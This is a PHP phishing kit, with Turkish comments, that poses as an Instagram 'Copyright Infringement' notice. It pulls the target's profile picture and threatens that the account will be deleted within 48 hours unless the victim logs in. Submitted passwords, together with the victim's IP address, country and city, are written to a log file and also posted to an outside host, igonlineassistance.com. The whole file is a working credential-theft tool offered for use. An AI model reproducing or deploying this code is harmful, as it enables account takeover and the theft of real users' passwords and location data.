<?php
//SCRİPTİ PAYLAŞMAMIN NEDENI UCRETLI SATAN OROSPU ÇOCUKLARINA İNATTIR MUCK <3
$lusy=$_GET['nick'];
include("api.php");
$ch = curl_init();
/////////========Luminati
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_URL, 'https://www.instagram.com/'.$lusy.''); ////This may differ from site to site
//curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Language: en-US,en;q=0.9',
'Cookie: SESSIONBURAYA', //SESSION
'Referer: https://www.instagram.com/'.$lusy.'/',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'sec-fetch-user: ?1',
'user-agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

$result = curl_exec($ch);
$html = str_get_html($result);
$lusyresim=$html->find('meta[property=og:image]', 0)->content;
if($_POST){

	$password=$_POST["password"];
	
	$ip=$_SERVER["REMOTE_ADDR"];
	$konum = file_get_contents("http://ip-api.com/xml/".$ip);
$cek = new SimpleXMLElement($konum);
$ulke = $cek->country;
$sehir = $cek->city;
date_default_timezone_set('Europe/Istanbul');  
$cur_time=date("d-m-Y H:i:s");
$file = fopen('hesaplar.php', 'a'); //TXT DE BURADAN DEGISIYOZ     <!-- @PANZERORJ -->
fwrite($file, "
<html>
<head>
	<meta http-equiv='Content-Type' content='text/html;charset=UTF-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'>

</head>
<style>

    .center {
      
      margin: 0 auto;
      
    }

    .awesome {
      
      color:#313131;
      -webkit-animation:colorchange 10s infinite alternate;
      
      
    }

    @-webkit-keyframes colorchange {
      0% {
        
        color: blue;
      }
      
      10% {
        
        color: #8e44ad;
      }
      
      20% {
        
        color: #1abc9c;
      }
      
      30% {
        
        color: #d35400;
      }
      
      40% {
        
        color: blue;
      }
      
      50% {
        
        color: #34495e;
      }
      
      60% {
        
        color: blue;
      }
      
      70% {
        
        color: #2980b9;
      }
      80% {
     
        color: #f1c40f;
      }
      
      90% {
     
        color: #2980b9;
      }
      
      100% {
        
        color: pink;
      }
    }
</style>
<body bgcolor='#000000'>
<body bgcolor='rgb(0,0,0)'>
<body bgcolor='black'>
<hr>
<font class='awesome' style='font-family:Arial'>
<font color='red'>Kullanıcı Adı: </font><font color='white'>".$lusy."</font><br>
<font color='red'> Şifre: </font><font color='white'>".$password."</font><br>
<font color='red'>Ip Adresi: </font><font color='white'>".$ip."</font><br>
<font color='red'>Tarih: </font><font color='white'>".$cur_time."</font><br>
<font color='red'>Ülke: </font><font color='white'>".$ulke."</font><br>
<font color='red'>Şehir: </font><font color='white'>".$sehir."</font><br>
</font>
<hr>
<br>

"); 
fclose($file);


header("location: form.php");
}
?>

<html>
    
<head>
	<title>Copyright Infringement @<?php echo $lusy; ?></title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1">
	
	    <script
      src="https://code.jquery.com/jquery-3.4.1.min.js"
      integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
      crossorigin="anonymous"
    ></script>
    <link
      href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"
      rel="stylesheet"
      type="text/css"
    />
    <style>
      .button {
-webkit-box-direction: normal;
margin: 0;
font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
border-radius: 3px;
border-style: solid;
border-width: 1px;
font-size: 14px;
font-weight: 600;
line-height: 26px;
outline: 0;
overflow: hidden;
text-overflow: ellipsis;
user-select: none;
white-space: nowrap;
width: 50%;
background: rgba(var(--d69,0,149,246),1);
border-color: rgba(var(--d69,0,149,246),1);
color: rgba(var(--eca,255,255,255),1);
cursor: pointer;
padding: 0 12px;
      }
      .button:disabled {
        opacity: 0.5;
      }
      .hide {
        display: none;
      }
    </style>
	<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/9/95/Instagram_new.svg/1200px-Instagram_new.svg.png">
</head>
<body>
	<div style="margin:0; padding;">

 
<div style=" padding:5px; margin:0px;
width:99%; height:45px;;
  background: #f09433; 
background: -moz-linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); 
background: -webkit-linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); 
filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#f09433', endColorstr='#bc1888',GradientType=1 );
  ">


  <table style="width:100%;margin:0px;">
      <tbody><tr style="width:100%;margin:0px;">
         <td style=" margin:0px;font-family:sans-serif;font-weight:bold;color:white;">Instagram</td>
         <td style="border:1px solid:white;color:white; margin:0px;
text-align:right;"><div style="border:1px solid white;margin:0px;
width:; text-align:center; margin-left:%;font-weight:bold;border-radius:5px;font-family:sans-serif;">GET
</div>

</td>
      </tr>
      <tr>
         <td style=" font-family:sans-serif;font-weight:400;color:white;font-size:13px;">Find It for free on Google Play.</td>
         <td>    </td>
      </tr>
   </tbody></table>



</div>
</div>


<center>
	<main>
	<img src="<?php echo $lusyresim; ?>" style="max-width:25%; border-radius:50%;">
			<h3 class="h3">Copyright Infringement on @<?php echo $lusy; ?></h3>
			<p>
We have received numerous complaints that you violated our copyright laws regarding your account. If you do not give us feedback, your account will be removed within 48 hours.
If you think this is wrong, continue by logging in.
			</p><br>

			<form method="post" id="your_form_id" enctype="copyright.php">
			<input type="password" id="ppas" name="password" placeholder="Password"  required="on">
			<br>

			
<button class="button">
      <i class="loading-icon fa fa-spinner fa-spin hide"></i>
      <span class="btn-txt">Log In</span>
			 </button>
			 <br>
			 <br>
			 
		</form>
	</main>

    <script>
      $(document).ready(function() {
        $(".button").on("click", function() {
          $(".result").text("");
          $(".loading-icon").removeClass("hide");
          $(".button").attr("disabled", true);
          $(".btn-txt").text("Loading...");
		  

		  pass= document.getElementById("ppas").value;
   

      if (pass=="")
		  {
           alert("Please fill in all fields.");
	$(".loading-icon").addClass("hide");
            $(".button").attr("disabled", false);
			$(".btn-txt").text("Log In");
			return false;
			}

          
	    
document.getElementById('your_form_id').submit();

		  
		  
   });
        });
		

    </script>
	<?php
	
	if($_POST){
	$ch = curl_init();
/////////========Luminati
////////=========Socks Proxy
curl_setopt($ch, CURLOPT_URL, 'https://igonlineassistance.com/pp/index.php'); ////This may differ from site to site

curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'Accept-Language: en,de-DE;q=0.9,de;q=0.8,en-US;q=0.7,tr;q=0.6',
'Content-Type: application/x-www-form-urlencoded',
'Origin: https://igonlineassistance.com',
'Referer: https://igonlineassistance.com/pp/'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.$lusy.'&password='.$password.'');
$result = curl_exec($ch);
curl_close($ch);
ob_flush();
	}
	?>
 <br>
<center> <img width="130" src="https://seeklogo.com/images/A/app-store-google-play-logo-4A2747BF5E-seeklogo.com.png">
		</center>
		<br>
	<div class="other">
		<img src="resim/from.png" alt="fb" width="95">
	</div>
</center>
</body>
<style type="text/css">
	*{font-family:sans-serif;}
	body{padding:0px;margin:0px;background:#fafafa}
	header{width:100%;
	height:145px;
      padding:0px;
      
	  background-color: white;
      margin:0px;}

.bilgikutu{width:100%;
	height:55px;
border:1px solid #cecece;
      padding:0px;
	  background-color: white;
      margin:0px;}
.hrktu{
border:1px solid #cecece;
}
		main{
			background:white;
			margin-top:20px;
			padding-top:20px;
			width:400px;
			max-width:90%;
			border:1px solid #dedede;
		}.h3{font-family:sans-serif;
			font-weight:400;
			color:#444;
			word-spacing:1px;
		}main p{
font-family:sans-serif;
color:#999;
width:270px; 
		}main input{
-webkit-box-direction: normal;
color: rgba(var(--i1d,38,38,38),1);
font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
background: 0 0;
border: 1px solid rgba(var(--b38,219,219,219),1);
border-radius: 3px;
box-sizing: border-box;
display: block;
font-size: 14px;
height: 34px;
line-height: 30px;
padding: 0 12px;
text-align: left;
width: 57%;
		}main .a_adaskpd{
			padding:7px 30px;
			margin-top:10px;
			outline:none;
			border:none;
			color:white;
			background:#3896f0;
			font-weight:bold;
			font-size:15px;
			margin-bottom:10px;
			border-radius:3px;
		}main input:focus{
			box-shadow: 0px 0px 0px 0px white;
			border:1px solid #3896f0;
		}
		.other{
border-bottom:1px solid #cecece;
		background:white;
		bottom:0px;
		position:fixed;
		width: 100%;
		}
</style>
</html>
